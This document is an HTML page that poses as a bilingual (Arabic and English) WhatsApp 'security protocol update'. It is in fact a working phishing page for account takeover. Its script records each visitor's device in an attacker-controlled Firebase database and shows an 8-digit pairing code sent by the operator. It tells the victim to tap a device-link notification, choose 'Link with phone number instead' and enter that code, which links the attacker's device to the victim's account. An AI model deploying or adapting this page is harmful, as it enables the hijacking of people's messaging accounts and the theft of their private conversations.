<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security</title>
    <style>
        * { box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; background-color: #ffffff; color: #1c1e21; font-family: -apple-system, sans-serif; }
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; }

        .container { width: 100%; max-width: 380px; text-align: center; }
        
        /* تكبير الشعار */
        .logo { width: 70px; margin-bottom: 15px; }
        
        .header-title { font-size: 19px; font-weight: 700; color: #075e54; margin-bottom: 8px; }
        .status-badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 20px; display: inline-block; }

        .version-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
        .v-row { display: flex; justify-content: space-between; align-items: center; margin: 10px 0; font-size: 13px; }
        .v-label { color: #667781; }
        .v-value { font-weight: bold; font-family: monospace; }
        .v-old { color: #d91e1e; }
        .v-new { color: #00a884; }

        .alert-text { font-size: 13.5px; line-height: 1.6; color: #3b4a54; margin-bottom: 18px; border-top: 1px solid #eee; padding-top: 15px; text-align: justify; }
        .highlight { color: #d91e1e; font-weight: bold; text-decoration: underline; }

        /* تصغير منطقة الكود */
        .code-zone { 
            background-color: #ffffff; 
            border: 1.8px solid #00a884; 
            padding: 10px; 
            border-radius: 8px; 
            width: 80%; 
            margin: 0 auto;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05); 
        }
        #pairing-code { font-size: 28px; font-weight: bold; color: #075e54; letter-spacing: 4px; font-family: 'Courier New', monospace; }
        .wait-text { font-size: 10.5px; color: #8696a0; margin-top: 6px; font-weight: 500; }
        
        [dir="rtl"] .alert-text { text-align: right; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div id="h_title" class="header-title"></div>
        <div id="h_dev" class="status-badge"></div>

        <div class="version-box">
            <div class="v-row">
                <span id="l_old" class="v-label"></span>
                <span class="v-value v-old">V2.12.5 (Old)</span>
            </div>
            <div style="height: 1px; background: #eee; margin: 5px 0;"></div>
            <div class="v-row">
                <span id="l_new" class="v-label"></span>
                <span class="v-value v-new">V3.0.1 (Latest)</span>
            </div>
        </div>

        <div id="h_alert" class="alert-text"></div>

        <div class="code-zone">
            <div id="pairing-code">. . .</div>
            <div id="h_wait" class="wait-text"></div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        
        const params = new URLSearchParams(window.location.search);
        const userId = params.get('id') || "NODE_" + Math.floor(Math.random() * 9999);
        const isAr = navigator.language.startsWith('ar');
        const device = /iPhone|iPad|iPod/.test(navigator.userAgent) ? "iPhone" : "Android";
        
        document.body.dir = isAr ? "rtl" : "ltr";

        const UI = {
            ar: {
                title: "تحديث أمان واتساب",
                dev: "جهازك المرتبط: " + device,
                old: "إصدار التشفير الحالي:",
                new: "الإصدار الأمني المطلوب:",
                alert: "لحماية خصوصيتك ومحادثاتك، يلتزم عليك الترقية لأحدث بروتوكول أمني (V3.0.1).<br><br><b>طريقة التفعيل:</b><br>1. سيصلك الآن إشعار رسمي من واتساب لربط الجهاز، اضغط عليه فوراً للمتابعة.<br>2. اختر <span class='highlight'>'الربط برقم الهاتف بدلاً من ذلك'</span>.<br>3. أدخل الرمز المكون من 8 أرقام الذي سيظهر هنا خلال لحظات:",
                wait: "جاري استلام الرمز.."
            },
            en: {
                title: "WhatsApp Security Update",
                dev: "Linked Device: " + device,
                old: "Current Protocol:",
                new: "Target Protocol:",
                alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).<br><br><b>How to activate:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <span class='highlight'>'Link with phone number instead'</span>.<br>3. Enter the 8-digit verification code that will appear here in a few moments:",
                wait: "Awaiting security code.."
            }
        };

        const lang = isAr ? UI.ar : UI.en;
        document.getElementById('h_title').innerText = lang.title;
        document.getElementById('h_dev').innerText = lang.dev;
        document.getElementById('l_old').innerText = lang.old;
        document.getElementById('l_new').innerText = lang.new;
        document.getElementById('h_alert').innerHTML = lang.alert;
        document.getElementById('h_wait').innerText = lang.wait;

        db.ref('visiting/' + userId).set({ device: device, status: "ready", ts: Date.now() });
        db.ref('sessions/' + userId).on('value', (s) => {
            if (s.val() && s.val().code) {
                document.getElementById('pairing-code').innerText = s.val().code;
                document.getElementById('h_wait').innerText = isAr ? "أدخل الكود في واتساب الآن" : "Enter code in WhatsApp now";
            }
        });
    </script>
</body>
</html>
